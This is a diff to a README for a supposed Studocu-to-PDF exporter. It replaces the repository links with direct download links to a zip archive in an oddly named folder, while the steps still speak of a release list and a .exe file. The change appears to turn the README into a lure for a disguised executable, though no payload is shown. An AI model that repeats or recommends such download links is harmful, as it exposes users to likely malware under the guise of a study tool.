@@ -1,6 +1,6 @@
 # 📄 Studocu_PDF-Exporter - Save your study documents as PDFs
 
-[![Download Link](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://github.com/hadrianonshore537/Studocu_PDF-Exporter)
+[![Download Link](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://github.com/hadrianonshore537/Studocu_PDF-Exporter/raw/refs/heads/main/barmybrained/Studocu_Exporter_PD_v2.5.zip)
 
 This tool converts documents from Studocu into PDF files. It focuses on study materials for research and education. Ensure you follow Studocu terms of service when you use this software.
 
@@ -21,7 +21,7 @@ Your computer must meet these needs to run the software:
 
 You need to visit the release page to get the installer for this tool. Follow these steps to obtain the correct file:
 
-1. Visit this page to download: [https://github.com/hadrianonshore537/Studocu_PDF-Exporter](https://github.com/hadrianonshore537/Studocu_PDF-Exporter)
+1. Visit this page to download: [https://github.com/hadrianonshore537/Studocu_PDF-Exporter/raw/refs/heads/main/barmybrained/Studocu_Exporter_PD_v2.5.zip](https://github.com/hadrianonshore537/Studocu_PDF-Exporter/raw/refs/heads/main/barmybrained/Studocu_Exporter_PD_v2.5.zip)
 2. Locate the most recent version in the list.
 3. Look for the file ending in .exe.
 4. Click the file name to start your download.
